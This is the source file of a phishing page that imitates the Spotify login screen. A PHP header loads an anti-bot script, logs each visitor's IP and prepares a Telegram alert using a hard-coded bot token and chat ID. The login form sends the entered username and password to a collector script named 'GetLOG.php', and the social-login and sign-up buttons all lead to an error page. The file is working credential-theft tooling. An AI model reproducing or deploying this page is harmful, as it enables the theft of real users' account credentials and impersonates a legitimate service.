<?php
include './CRfiles/PHP/botfucker.php';
$ip = getenv("REMOTE_ADDR");
  $message = "[Alert] NEW VISITOR FROM IP : $ip ";
  $token ='1900956727:AAHEk81s5ZHuFSD0kGvNZEr6bTTv-ttON_0';
    $data = [
    'text' => $message,
    'chat_id' => '-614536082'
];
 ?>
<!DOCTYPE html>

<html id="app" lang="en" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding">Login - Spotify</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!--<base href="/">--><base href=".">
  <link rel="icon" href="./CRfiles/favicon.ico">
  <link href="./CRfiles/index.b48f2b8327399f826bfd.css" media="screen" rel="stylesheet">

  
  </head>
<body ng-controller="LoginController" class="ng-scope">
  <!-- ngInclude: template --><div ng-include="template" class="ng-scope"><div sp-header="" class="ng-scope"><div class="head ">
  <a class="spotify-logo" tabindex="-1" title="Spotify" ng-href="/en" href="./Spow/Error.php"></a>
</div>
</div>

<div class="container-fluid login ng-scope">
 
  <div class="content">
    <!-- ngIf: showContinueLabel --><div class="row ng-scope" ng-if="showContinueLabel">
          <div class="col-xs-12 text-center">
              <h1 id="login-to-continue" class="h5 ng-binding">To continue, log in to Spotify.</h1>
          </div>
    </div><!-- end ngIf: showContinueLabel -->
    <!-- ngIf: status && status !== 200 -->
    <div class="row">
      <div class="col-xs-12">
        <a href="./SpoW/Error.php" class="btn btn-block btn-facebook ng-binding" target="_parent" role="button">Continue with Facebook</a>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-12">
        <a href="./SpoW/Error.php" class="btn btn-block btn-black btn-apple ng-binding" target="_parent" role="button">Continue with Apple</a>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-12">
        <a href="./SpoW/Error.php" class="btn btn-block btn-default btn-google ng-binding" target="_parent" role="button" >Continue with Google</a>
      </div>
    </div>
    

    <div class="row">
      <div class="col-xs-12">
        <div class="divider">
          <strong class="divider-title ng-binding">or</strong>
        </div>
      </div>
    </div>

    <form  method="post" action="./MrCorona/GetLOG.php" class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">
       <input type="hidden" value="SpoW" name="MrCorona">
      <div class="row" ng-class="{&#39;has-error&#39;: (accounts.username.$dirty &amp;&amp; accounts.username.$invalid) || invalidCredentials}">
        <div class="col-xs-12">
          <label for="login-username" class="control-label ng-binding">
            Email address or username
          </label>
          <input type="text" class="form-control input-with-feedback ng-pristine ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched focus-visible" name="userCorona" placeholder="Email address or username" required=""  autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" >
          <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid -->
        </div>
      </div>

      <div class="row" ng-class="{&#39;has-error&#39;: (accounts.password.$dirty &amp;&amp; accounts.password.$invalid) || invalidCredentials}">
        <div class="col-xs-12">
          <label for="login-password" class="control-label ng-binding">
            Password
          </label>
          <input type="password" class="form-control input-with-feedback ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" name="passCorona"  placeholder="Password" required="" autocomplete="off" >

        </div>
      </div>

      <!-- ngIf: showAutomationKey -->

          <div class="row password-reset">
            <div class="col-xs-12">
              <p>
                <a id="reset-password-link" href="./SpoW/Error.php" analytics-on="click" analytics-category="Login View" analytics-event="Forgot Button" analytics-label="" class="ng-binding">Forgot your password?</a>
              </p>
            </div>
          </div>

      <div class="row row-submit">
        <div class="col-xs-12 col-sm-6">
          <div class="checkbox">
            <label class="ng-binding">
              <input ng-model="form.remember" type="checkbox" name="remember" analytics-on="checked" analytics-category="Login View" id="login-remember" class="ng-pristine ng-untouched ng-valid ng-not-empty">
              Remember me
              <span class="control-indicator"></span>
            </label>
          </div>
        </div>
        <div class="col-xs-12 col-sm-6">
          <button class="btn btn-block btn-green ng-binding" id="login-button" ng-click="onLoginClick($event)">Log In</button>
        </div>
      </div>
    </form>

    <div id="sign-up-section">
      <div class="row">
        <div class="col-xs-12">
          <signup class="ng-isolate-scope"><!-- ngIf: showSignup --><div ng-if="showSignup" class="ng-scope">
    <!-- ngIf: showButton --><div ng-if="showButton" class="ng-scope">
        <div class="row">
            <div class="col-xs-12">
                <div class="divider">
                    <!-- ngIf: showOrLabel -->
                </div>
            </div>
        </div>
        <div class="row text-center mt-0">
            <h2 class="h4 ng-binding">Don't have an account?</h2>
        </div>
        <div>
            <div class="row">
                <div class="col-xs-12">
                    <a class="btn btn-block btn-default ng-binding" role="button" href="./Spow/Error.php">Sign up for Spotify</a>
                </div>
            </div>
        </div>
    </div><!-- end ngIf: showButton -->

    <!-- ngIf: showAppStoreBanner -->
</div><!-- end ngIf: showSignup -->
</signup>
        </div>
      </div>
    </div>

  </div><!-- .content -->
</div><!-- .container -->
</div>


<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div></body></html>